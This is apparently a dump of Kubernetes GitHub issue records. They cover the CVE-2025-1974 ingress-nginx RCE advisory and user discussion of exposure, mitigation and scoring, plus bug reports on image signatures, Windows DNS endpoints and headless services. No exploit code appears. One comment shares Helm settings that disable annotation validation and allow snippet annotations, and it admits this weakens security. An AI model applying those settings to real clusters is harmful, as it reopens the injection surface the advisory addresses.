suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131009, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131009", "issue_title": "CVE-2025-1974: ingress-nginx admission controller RCE escalation", "issue_author": "tabbysable", "issue_body": "CVSS Rating: ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)) (Score: 9.8, Critical)\n\nA security issue was discovered in Kubernetes where under certain conditions, an unauthenticated attacker with access to the pod network can achieve arbitrary code execution in the context of the ingress-nginx controller. This can lead to disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)\n\n### Am I vulnerable?\n\nThis issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \\`kubectl get pods \\--all-namespaces \\--selector app.kubernetes.io/name=ingress-nginx\\`.\n\n#### Affected Versions\n\n- < v1.11.0\n- v1.11.0 \\- 1.11.4  \n- v1.12.0\n\n### How do I mitigate this vulnerability?\n\n**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.\n\nBefore applying the patch, this issue can be mitigated by disabling the Validating Admission Controller functionality of ingress-nginx.\n\n#### Fixed Versions\n\n- ingress-nginx [main@0ccf4ca](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/0ccf4caaadec919680c455d221e53d97970d527d)\n\nTo upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)\n\n### Detection\n\nThere are no known indicators of compromise that prove this vulnerability has been exploited.\n\nIf you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io\n\n#### Acknowledgements\n\nThis vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik, and Hillai Ben Sasson from Wiz\n\nThe issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee\n", "issue_labels": ["kind/bug", "sig/network", "area/security", "committee/security-response", "triage/accepted", "official-cve-feed"], "comments": [{"author": "tabbysable", "body": "/triage accepted"}, {"author": "thisisharrsh", "body": "Hi @tabbysable, Please add the issue description for better understanding of the issue.\n/triage needs-information"}, {"author": "tabbysable", "body": "/area security\n/kind bug\n/committee security-response\n/label official-cve-feed\n/sig network"}, {"author": "tabbysable", "body": "/assign @tabbysable "}, {"author": "tabbysable", "body": "Record is now live in CVE database: https://www.cve.org/CVERecord?id=CVE-2025-1974"}, {"author": "tabbysable", "body": "Builds have completed: [v1.11.5](https://github.com/kubernetes/ingress-nginx/pull/13074) and [v1.12.1](https://github.com/kubernetes/ingress-nginx/pull/13073) are now available! "}, {"author": "whereisaaron", "body": "Hi, thank you for these quick releases! Right now AWS still provides extended commercial support for k8s v1.25, which can only deploy nginx-ingress up to v1.9.6, so there would likely be value for quite a few users in a patched build v1.9.7.\n\nUpgrading the entire cluster to v1.26 in order to access v1.11.5 would be another option, but that's a much bigger task. So a patched v1.9.7 would enable faster resolution of these issues."}, {"author": "BenTheElder", "body": "> Right now AWS still provides extended commercial support for k8s v1.25, which can only deploy nginx-ingress up to v1.9.6, so there would likely be value for quite a few users in a patched build v1.9.7.\n\nKubernetes supports 1.30+ https://kubernetes.io/releases/\n\nSee also the pinned issue in the ingress-nginx issue tracker (note the CVEs are all recorded here but the issue tracker in this repo isn't generally used for ingress-nginx).\n\nhttps://github.com/kubernetes/ingress-nginx/issues/13002"}, {"author": "ganesshwankhede", "body": "Looks like services with ExternalName are started failing after this upgrade \n\napiVersion: v1\nkind: Service\nmetadata:\n  name: external-service\n  namespace: default\nspec:\n  type: ExternalName\n  externalName:  13.117.2323.20 \n  ports:\n    - port: 80\n      targetPort: 8080"}, {"author": "ksyblast", "body": "Looks like something is also broken when using annotations for oauth2-proxy, can provide more details if needed, example:\n```\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  annotations:\n    external-dns.alpha.kubernetes.io/ingress-hostname-source: annotation-only\n    kubernetes.io/ingress.class: nginx-ext\n    nginx.ingress.kubernetes.io/affinity: cookie\n    nginx.ingress.kubernetes.io/affinity-mode: balanced\n    nginx.ingress.kubernetes.io/auth-signin: https:/host.example.com/proxy/oauth2/start?rd=https://host.example.com/proxy/oauth2/callback\n    nginx.ingress.kubernetes.io/auth-url: https://host.example.com/proxy/oauth2/auth\n    nginx.ingress.kubernetes.io/backend-protocol: HTTPS\n    nginx.ingress.kubernetes.io/configuration-snippet: |\n      auth_request_set $user   $upstream_http_x_auth_request_preferred_username;\n      auth_request_set $email  $upstream_http_x_auth_request_email;\n      proxy_set_header X-User  $user;\n      proxy_set_header X-Email $email;\n      auth_request_set $token  $upstream_http_x_auth_request_access_token;\n      proxy_set_header X-Access-Token $token;\n      auth_request_set $auth_cookie $upstream_http_set_cookie;\n      add_header Set-Cookie $auth_cookie;\n      auth_request_set $auth_cookie_name_upstream_1 $upstream_cookie_auth_cookie_name_1;\n        if ($auth_cookie ~* \"(; .*)\") {\n            set $auth_cookie_name_0 $auth_cookie;\n            set $auth_cookie_name_1 \"auth_cookie_name_1=$auth_cookie_name_upstream_1$1\";\n        }\n        if ($auth_cookie_name_upstream_1) {\n            add_header Set-Cookie $auth_cookie_name_0;\n            add_header Set-Cookie $auth_cookie_name_1;\n        }\n    nginx.ingress.kubernetes.io/proxy-buffer-size: 128k\n    nginx.ingress.kubernetes.io/proxy-buffering: \"on\"\n  generation: 2\n  name: ing\n  namespace: ns\nspec:\n  ingressClassName: nginx\n  rules:\n  - host: host.example.com\n    http:\n      paths:\n      - backend:\n          service:\n            name: svc\n            port:\n              number: 8443\n        path: /\n        pathType: Prefix\n  tls:\n  - hosts:\n    - host.example.com\n    secretName: ssl\n\n```"}, {"author": "a-yiorgos", "body": "@ksyblast newer versions of ingress-nginx have the configuration snippet capability disabled by default.  You need to enable it\n\nhttps://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#allow-snippet-annotations"}, {"author": "rafaelgaspar", "body": "> Hi, thank you for these quick releases! Right now AWS still provides extended commercial support for k8s v1.25, which can only deploy nginx-ingress up to v1.9.6, so there would likely be value for quite a few users in a patched build v1.9.7.\n> \n> Upgrading the entire cluster to v1.26 in order to access v1.11.5 would be another option, but that's a much bigger task. So a patched v1.9.7 would enable faster resolution of these issues.\n\n1.9.x is also the last version with support for `opentracing`."}, {"author": "ghost", "body": "@ksyblast \n> Looks like something is also broken when using annotations for oauth2-proxy, can provide more details if needed, example:\n> \n\nWe had this issue in the upgrade too. There are few configuration settings you need to change. Please see: https://github.com/kubernetes/ingress-nginx/issues/12655\n\nTL;DR\n```\n    controller:\n      allowSnippetAnnotations: true\n      enableAnnotationValidations: false\n      config:\n        annotations-risk-level: \"Critical\"\n```\n\n(I am not saying turning off these security settings is a good idea, but it was necessary for our configuration to continue working for the moment)"}, {"author": "Veronica4036", "body": "I'm trying to understand the attack surface for CVE-2025-1974 in our environment where:\n- EKS worker nodes are in private subnets\n- The ingress-nginx admission controller is only exposed via ClusterIP service\n- No public LoadBalancer or NodePort exposure for the admission webhook\n\nMy understanding is that this setup provides multiple layers of protection:\n1. The admission webhook's ClusterIP is only accessible within the cluster\n2. Private subnets prevent direct internet access to the nodes\n3. Access would require compromising another workload within the cluster first\n\nHowever, I'd appreciate clarification on:\n- Is this a sufficient security boundary?\n- Are there any edge cases where the admission controller could still be exposed?\n- Should we still upgrade despite these network controls?\n\nEDIT - Created a new issue to get some traction #131062 "}, {"author": "arianitu", "body": "Can we please get a k8s network policy that prevents this exploit ASAP? For people who have network policies enabled, it seems like the easiest mitigation mechanism (requiring no changes such as deleting the webhook) would be disabling traffic to it. \n\nI'm looking into it, but I am unsure what needs access to ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local for example."}, {"author": "arianitu", "body": "EDIT:\n\nI've deleted this network policy because it will not work, still looking to find one that would mitigate this without requiring deletion of anything\n\nEDIT2:\n\nI gave up on a network policy mechanism as it was complex and instead followed the mitigation of deleting the `validating-webhook` lines from the deployment and removing the ingress-nginx-admission ValidatingWebhookConfiguration\n\nI am unsure if there's a good network policy that still allows the control pane to access the webhook but no other namespaces as you would need to restrict the port with cidr ranges (I believe) and that gets tricky. If your control pane ranges are static I think its possible to keep functionality the same and still mitigate but I wasn't able to find a good way to get control pane CIDR ranges for managed k8s on public clouds. \n\nI still feel like a network policy that mitigates this would be fantastic instead of having to delete the functionality entirely for people who cannot upgrade right away. "}, {"author": "mariocandela", "body": "Guys, if I can help you in any way, drop me a message!"}, {"author": "thenam153", "body": "I'm researching ways to mitigate the attack surface of this CVE, and I currently have a question regarding the attack payload injection via the ingress controller. \n\nSpecifically, if we prevent reading file descriptors (like `/proc/xx/fd/xxx`) within the container using the `www-data` user, would this effectively reduce the attack surface associated with this vulnerability? \n\nOr are there alternative methods to inject payloads without relying on file descriptor access?"}, {"author": "stefanlasiewski", "body": "> this issue can be mitigated by disabling the Validating Admission Controller functionality of ingress-nginx.\n\nWouldn't this expose us to other, past CVEs? My understanding is that the validating admission controller will validate (Sanitize) a number of fields and thus prevent users from adding unsanitized or malicious text into those fields, and blocks a number of exploits & CVEs from before IngressNightmare. \n\nDoes disabling the Validating Admission Control allow unsanitized input?"}, {"author": "Kingshuk-Kubera", "body": "https://github.com/kubernetes/ingress-nginx/releases\n\n**In above link, change log of \"controller-v1.12.1\" says -**\n\n\"This release fixes the following CVEs:\n\nCVE-2025-1097\nCVE-2025-1098\nCVE-2025-1974\nCVE-2025-24513\nCVE-2025-24514\n\"\n**Just below that, it also says -**\n\"Unfortunately, to fix  CVE-2025-1974 it was necessary to disable the validation of the generated NGINX configuration during the validation of Ingress resources.\"\n\nDoes that imply, upgrading to v1.12.1 is not enough, I have to also additionally disable \"Validating Admission Controller\" by doing any of the following  -\nIf you have installed ingress-nginx using Helm - Reinstall, setting the Helm value controller.admissionWebhooks.enabled=false\n\nIf you have installed ingress-nginx manually -\ndelete the ValidatingWebhookconfiguration called ingress-nginx-admission\nedit the ingress-nginx-controller Deployment or Daemonset, removing --validating-webhook from the controller container\u2019s argument list\n\nPlease advise.\n\n"}, {"author": "johanot", "body": "@Kingshuk-Kubera I read it as: The admission controller is now less smart. Generated nginx config used to be verified _both_ by the admission controller and by nginx itself at reload. Now, to prevent CVE-2025-1974, only the latter happens.\n\nIt means that you are safe, and enabling the admission-controller is safe, but the fix comes with the cost of a slightly higher risk of nginx failing at runtime (at config reload) due to invalid config."}, {"author": "Kingshuk-Kubera", "body": "@johanot : One more clarification, change log also says - \n\"The resulting NGINX configuration is still checked before the actual loading, so that there are no failures of the underlying NGINX. However, invalid Ingress resources can lead to the NGINX configuration no longer being able to be updated.\"\n\n**What is the meaning of \"However, invalid Ingress resources can lead to the NGINX configuration no longer being able to be updated.\"?**\n\n"}, {"author": "theCapypara", "body": "As far as I understand:\nThis means that any invalid ingress resource could stop any further changes to the Nginx configuration from actually being applied.\nThis would mean that your ingress would stop \"reacting\" to any changes in any ingress resource until the resource that is \"blocking\" the update from working is fixed.\nThis is basically the same behaviour that existed before the admission webhook was introduced."}, {"author": "TomyLobo", "body": "> CVSS Rating: ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)) (Score: 9.8, Critical)\n\nvs.\n\n> an unauthenticated attacker with access to the pod network\n\nThe pod network isn't routed.\nDoesn't that make it AV:A, not AV:N?\n**That would lower the score from 9.8 to 8.8 (High).**\n\nFor reference, here are the definitions:\n<details>\n<summary>Attack Vector: Network (AV:N):</summary>\nThe vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed, up to and including the entire Internet. Such a vulnerability is often termed 'remotely exploitable' and can be thought of as an attack being exploitable at the protocol level one or more network hops away (e.g., across one or more routers).\n</details>\n\n<details>\n<summary>Attack Vector: Adjacent (AV:A):</summary>\nThe vulnerable component is bound to the network stack, but the attack is limited at the protocol level to a logically adjacent topology. This can mean an attack must be launched from the same shared physical (e.g., Bluetooth or IEEE 802.11) or logical (e.g., local IP subnet) network, or from within a secure or otherwise limited administrative domain (e.g., MPLS, secure VPN to an administrative network zone).\n</details>"}, {"author": "johanot", "body": "@TomyLobo \n\n> The pod network isn't routed.\n\nIt is not directly routable in most of my installations, but in _some_ setups it is. I have customers with DHCP CNI and corp-wide routable service-nets and pod-nets.\n\nSpeaking of the service-net (cluster-ips).. This also gives access to the admission-controller.\n\nAlso; in other setups, these nets might not be routable, but the cluster itself is multi-tenancy, so workload in user-namespaces might be less trustworthy. Remember, any pod in _any_ namespace has access to the pod net.\n\nThat said; I don't have any opinions on whether the above arguments make it `AV:N` or not."}, {"author": "ErikEngerd", "body": "Looks like there is only a vulnerability from external (outside pod network) when the validating admission controller is exposed publically (which it usually isn't). Also from inside the pod network, when restricting network traffic using network policies to allow only the required traffic by pods, the attack is also impossible it seems. \n\n"}, {"author": "Mr-P-D", "body": "Based on the official comments from the Kubernetes Blog, PODs can only be accessed by the people/user in the same VPC/corporate network. \n\n![Image](https://github.com/user-attachments/assets/13893b89-ea00-4acb-b428-f29ec2c21334)\n\nHence, i think the Attack Vector parameter in CVSS Score should be **Adjacent (A)** and not Network, as this vulnerability is not remotely exploitable. External attacker cannot directly interact with PODs, making it impossible to exploit remotely.\n\nReference - https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/\n\n"}, {"author": "tuminoid", "body": "> Hence, i think the Attack Vector parameter in CVSS Score should be **Adjacent (A)** and not Network, as this vulnerability is not remotely exploitable. External attacker cannot directly interact with PODs, making it impossible to exploit remotely.\n\nFrom the [wiz.io blog](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities):\n\n![Image](https://github.com/user-attachments/assets/e1a7914d-aef9-4d70-a5ab-ad90faa0b530)\n\nSome folks publicly expose the admission controller, which warrants Network I believe \ud83e\udd37 "}, {"author": "suhettfilipe", "body": "I had an issue after the update. We were using version 1.10 and upgraded to 1.12.1, but we encountered a problem with our external ingress\u2014some ingress hosts were returning 404. However, when we switched to 1.11.5, the issue was resolved. Do you know anything about this?\n\nEdit: I found the problem here:\nhttps://github.com/kubernetes/ingress-nginx/issues/12655"}, {"author": "ntavares", "body": "Thanks @suhettfilipe indeed, version 1.12.1 seems to not be doing what this CVE or documentation is stating,  it seems to discard ingresses with configuration/server -snippets, regardless of [allow-snippet-annotations: true](https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/#allow-snippet-annotations) (~~didn't check if annotations-risk-level: Critical will help~~ I decided to check this, from what I can see we need to use the configurations allow-snippet-annotations=true together with annotations-risk-level=Critical).\n\nThis is particularly confusing because if the error is introduced after controller is deployed, the ingress' nginx configuration is not refreshed, but intead the previous version will keep running. So everything seems fine, until one day the pod restarts, and you're presented with a missing ingress..."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133936, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133936", "issue_title": "Unable to verify signed images for multiple Kubernetes Releases", "issue_author": "eshaanm25", "issue_body": "### What happened?\n\nSimilar to #129199, I tried to verify the Kubernetes API Server image using the command mentioned in the [Kubernetes docs](https://kubernetes.io/docs/tasks/administer-cluster/verify-signed-artifacts/#verifying-image-signatures) for the latest Kubernetes version but received a `404` error:\n\n```sh\ncosign verify registry.k8s.io/kube-apiserver-amd64:v1.34.0 \\\n  --certificate-identity krel-trust@k8s-releng-prod.iam.gserviceaccount.com --verbose \\\n  --certificate-oidc-issuer https://accounts.google.com -o json \\\n  | jq .\n\n2025/09/08 11:36:07 <-- 404 https://us-south1-docker.pkg.dev/v2/k8s-artifacts-prod/images/kube-apiserver-amd64/manifests/sha256-495d3253a47a9a64a62041d518678c8b101fb628488e729d9f52ddff7cf82a86.sig (63.266ms)\n2025/09/08 11:36:07 HTTP/2.0 404 Not Found\nContent-Length: 149\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\nContent-Type: application/json; charset=utf-8\nDate: Mon, 08 Sep 2025 16:36:07 GMT\nDocker-Distribution-Api-Version: registry/2.0\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Xss-Protection: 0\n\n{\"errors\":[{\"code\":\"MANIFEST_UNKNOWN\",\"message\":\"Failed to fetch \\\"sha256-495d3253a47a9a64a62041d518678c8b101fb628488e729d9f52ddff7cf82a86.sig\\\"\"}]}\n\nError: no signatures found\nerror during command execution: no signatures found\n```\n\nFunny enough, the verification _does_ work for `v1.33.0` but not for `v1.32.0`. In #129199, `v1.32.0` was confirmed to work, so it seems like signatures are being deleted as well.\n\nThis could be related to https://github.com/kubernetes/release/issues/2962, but having signatures that already existed being removed seems to be another issue of its own.\n\n### What did you expect to happen?\n\nThe signature should exist and be verified. For example:\n\n```sh\ncosign verify registry.k8s.io/kube-apiserver-amd64:v1.33.0 \\\n  --certificate-identity krel-trust@k8s-releng-prod.iam.gserviceaccount.com \\\n  --certificate-oidc-issuer https://accounts.google.com -o json \\\n  | jq .\n\n[\n  {\n    \"critical\": {\n      \"identity\": {\n        \"docker-reference\": \"registry.k8s.io/kube-apiserver-amd64\"\n      },\n      \"image\": {\n        \"docker-manifest-digest\": \"sha256:6c0f4ade3e5a34d8791a48671b127a00dc114e84b70ec4d92e586c17d68a1ca6\"\n      },\n...\n```\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nFrom [Kubernetes Docs](https://kubernetes.io/docs/tasks/administer-cluster/verify-signed-artifacts/#verifying-image-signatures)\n>```sh\n>cosign verify registry.k8s.io/kube-apiserver-amd64:v1.34.0 \\\n>  --certificate-identity krel-trust@k8s-releng-prod.iam.gserviceaccount.com --verbose \\\n>  --certificate-oidc-issuer https://accounts.google.com -o json \\\n>  | jq .\n>```\n\n### Anything else we need to know?\n\nThis can cause failures around cluster startup if image verification is implemented in Kubernetes Clusters\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\nClient Version: v1.34.0\n```\nNA\n</details>\n\n\n### Cloud provider\n\n<details>\nNA\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\nNA\n</details>\n\n\n### Install tools\n\n<details>\nNA\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\nNA\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\nNA\n</details>\n", "issue_labels": ["kind/bug", "sig/release", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "eshaanm25", "body": "/sig release"}, {"author": "BenTheElder", "body": "cc @kubernetes/release-engineering "}, {"author": "xmudrii", "body": "This is a known issue, caused by https://github.com/kubernetes-sigs/promo-tools/issues/1271, and we are already tracking it in https://github.com/kubernetes/release/issues/2962. We don't have any ETA at the moment when this might be fixed.\n\nSince we're already tracking this, I'll go ahead and close this issue, please follow https://github.com/kubernetes/release/issues/2962 for updates.\n/close"}, {"author": "k8s-ci-robot", "body": "@xmudrii: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133936#issuecomment-3306033939):\n\n>This is a known issue, caused by https://github.com/kubernetes-sigs/promo-tools/issues/1271, and we are already tracking it in https://github.com/kubernetes/release/issues/2962. We don't have any ETA at the moment when this might be fixed.\n>\n>Since we're already tracking this, I'll go ahead and close this issue, please follow https://github.com/kubernetes/release/issues/2962 for updates.\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131387, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131387", "issue_title": "CoreDNS HNS Endpoint IP is not updated on pod restart", "issue_author": "ValeriiVozniuk", "issue_body": "### What happened?\n\nWhen CoreDNS pod on Linux node restarts and receives a new cluster IP, endpoints/endpointslices in Kubertenes are updated with new pod IP, but on Windows worker HNS Endpoint still holds the old IP address. Kubernetes restart on Windows doesn't help, need to delete all stuff and re-join node to cluster again.\n\n### What did you expect to happen?\n\n HNS Endpoint would be updated with new IP address after CoreDNS pod restart\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n\n1.    Deploy a cluster with 3 Linux master nodes.\n2.    Join 1 Windows worker node.\n3.    Start sample workload on Windows node (used mcr.microsoft.com/dotnet/framework/samples:aspnetapp)\n4.    Exec into Windows pod with cmd, type nslookup, observe working output\n```\nDefault Server:  kube-dns.kube-system.svc.cluster.local\nAddress:  10.43.0.10\n```\n5.    Exit Windows pod, get pods list from kube-system namespace with -o wide, note CoreDNS pod ip.\n6.    Delete CoreDNS pod, wait for new to start, check its IP address.\n7.    Exec again into Windows pod, type nslookup, observe timeout errors\n```\nDNS request timed out.\n    timeout was 2 seconds.\nDefault Server:  UnKnown\nAddress:  10.43.0.10\n```\n8.    Type server <new_coredns_pod_ip>, and after timeout try to resolve any dns name (for example c.cc), you would see that connectivity is working.\n9.    RDP into Windows server, start Powershell, run\n```\nhnsdiag list all | findstr 10.43.0.10\n```\nyou will see the output like this\n```\nce87ca71-adfd-4334-a5ce-760eae297bef |  10.43.0.10      | 6f995c07-0b4a-4cfb-ba6e-c62dd48a554d\n302522f6-f540-4120-881c-b7a2eeecf0f6 |  10.43.0.10      | 6f995c07-0b4a-4cfb-ba6e-c62dd48a554d\nddd666f5-c1e9-4fe1-af6b-da97be5cdb29 |  10.43.0.10      | 6f995c07-0b4a-4cfb-ba6e-c62dd48a554d\n```\n10.    Run\n```\nget-hnsendpoint 6f995c07-0b4a-4cfb-ba6e-c62dd48a554d\n```\nand in output IPAddress would be old CoreDNS pod IP address, not the new one.\n\n### Anything else we need to know?\n\nThe deployment is done with k3s all in one binary, which could make some influence here, but the issue looks like in Kubernetes itself.\nThe one thing I didn't test is what would happen if I would update HNS Endpoint with the new pod IP, but unfortunately I didn't find a way to perform such update. Any ideas? :)\n\n### Kubernetes version\n\n1.28 - 1.32\n\n### Cloud provider\n\nk3s baremetal deployment\n\n\n### OS version\n\n<details>\n```\nPRETTY_NAME=\"Ubuntu 22.04.5 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.5 LTS (Jammy Jellyfish)\"\nVERSION_CODENAME=jammy\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=jammy\n```\n$ uname -a\nLinux test01 5.15.0-136-generic #147-Ubuntu SMP Sat Mar 15 15:53:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\nBuildNumber  Caption                                 OSArchitecture  Version\n17763        Microsoft Windows Server 2019 Standard  64-bit          10.0.17763\n```\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ValeriiVozniuk", "body": "https://github.com/kubernetes-sigs/sig-windows-tools/issues/380 - Initial report on sig-windows-tools"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131387#issuecomment-3302266939):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134040, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134040", "issue_title": "kubectl prints a warning about spec.SessionAffinity being ignored when creating a headless service", "issue_author": "simonpasquier", "issue_body": "### What happened?\n\nWhen creating a headless service (see manifest in the reproducer section) without session affinity defined, kubectl (version v1.34.1) always prints a warning:\n\n```\nWarning: spec.SessionAffinity is ignored for headless services\n````\n\nAs  far as I can tell, session affinity when unset defaults to `None` so there's no way for the validation to determine whether or not a value was defined by the client.\n\n### What did you expect to happen?\n\nNo warning.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRun this command\n\n```\nkubectl create -f -<<EOF\napiVersion: v1\nkind: Service\nmetadata:\n  name: headless\nspec:\n  clusterIP: None\n  ports:\n  - name: web\n    port: 9090\n    protocol: TCP\n    targetPort: web\n  selector:\n    app.kubernetes.io/name: prometheus\n  type: ClusterIP\nEOF\n```\n\n### Anything else we need to 